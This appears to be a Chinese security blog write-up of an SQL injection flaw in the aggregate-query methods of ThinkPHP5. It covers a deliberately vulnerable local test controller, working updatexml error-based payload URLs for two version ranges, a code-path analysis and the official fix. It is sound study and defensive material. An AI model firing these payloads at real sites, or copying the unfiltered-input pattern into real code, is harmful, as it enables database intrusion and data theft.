# ThinkPHP5 SQL注入

Author: H3rmesk1t

Data: 2021.08.14

# 漏洞概要
- 本次漏洞存在于所有 `Mysql` 聚合函数相关方法，由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL注入漏洞 的产生
- 漏洞影响版本： 5.0.0<=ThinkPHP<=5.0.21 、 5.1.3<=ThinkPHP5<=5.1.25 

# 初始配置
获取测试环境代码

```bash
composer create-project --prefer-dist topthink/think=5.1  tpH3rmesk1t
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ad95b5b9781f4b9fabccb2dbae673760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

将 composer.json 文件的 require 字段设置成如下

```bas
"require": {
    "php": ">=5.6.0",
    "topthink/framework": "5.1.7"
}
```

然后执行 `composer update`

![在这里插入图片描述](https://img-blog.csdnimg.cn/344ef95318c342f1914da5e9a4f90185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

- 下载后的源码中，需要对`application/index/controller/Index.php`内容进行修改

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $options = request()->get('options');
        $result = db('users')->max($options);
        var_dump($result);
        return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"<h1>:) </h1><pThinkPHP V5.1<br/><span style="font-size:30px">12载初心不改（2006-2018） - 你值得信赖的PHP框架</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
    }
}
```

在`config/database.php`文件中配置数据库相关信息，并开启`config/app.php`中的app_debug和app_trace,创建数据库信息如下

```php
create database thinkphp;
use thinkphp;
create table users(
	id int primary key auto_increment,
	username varchar(50) not null,
);
insert into users(id,username) values(1,'H3rmesk1t');
```
# 漏洞利用

Payload

```bas
5.0.0~5.0.21 、 5.1.3～5.1.10
http://127.0.0.1/cms/public/index.php?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23
5.1.11～5.1.25 
http://127.0.0.1/cms/public/index.php?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/eb88c5392a2745b98f180ba3d5d012ad.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 漏洞分析

用户可控数据未经过滤，传入 `Query` 类的 `max` 方法进行聚合查询语句构造，接着调用本类的 `aggregate` 方法，本次漏洞问题正是发生在该函数底层代码中，所以所有调用该方法的聚合方法均存在 SQL 注入问题，我们看到 `aggregate` 方法又调用了 `Mysql` 类的 `aggregate` 方法，在该方法中，我们可以明显看到程序将用户可控变量 `$field` 经过 `parseKey` 方法处理后，与 SQL 语句进行了拼接

其余流程和之前的分析差不多，具体看看 `parseKey` 方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/e20d6659c1eb403c80289a864e0ff5ff.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

`parseKey` 方法主要是对字段和表名进行处理，这里只是对我们的数据两端都添加了反引号，经过 `parseKey` 方法处理后，程序又回到了上图的 `$this->value()` 方法中，该方法会调用 `Builder` 类的 `select` 方法来构造 SQL 语句，这个方法应该说是在分析 ThinkPHP 漏洞时，非常常见的了，其无非就是使用 `str_replace` 方法，将变量替换到 SQL 语句模板中，这里重点关注 `parseField` 方法，因为用户可控数据存储在 `$options['field']` 变量中并被传入该方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/35601821d47a44b98695c4cc5a8b4ac0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

进入 `parseField` 方法，我们发现用户可控数据只是经过 `parseKey` 方法处理，并不影响数据，然后直接用逗号拼接，最终直接替换进 SQL 语句模板里，导致 SQL注入漏洞 的发生

![在这里插入图片描述](https://img-blog.csdnimg.cn/a181aa72590b4399818ada6fa8b897df.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 漏洞修复

官方的修复方法是：当匹配到除了 字母、点号、星号 以外的字符时，就抛出异常

![在这里插入图片描述](https://img-blog.csdnimg.cn/835bd07f790849cda255290687ec65b1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 攻击总结

参考Mochazz师傅的审计流程

![在这里插入图片描述](https://img-blog.csdnimg.cn/f4c78426789146f79568f3a6bfb5d9d3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
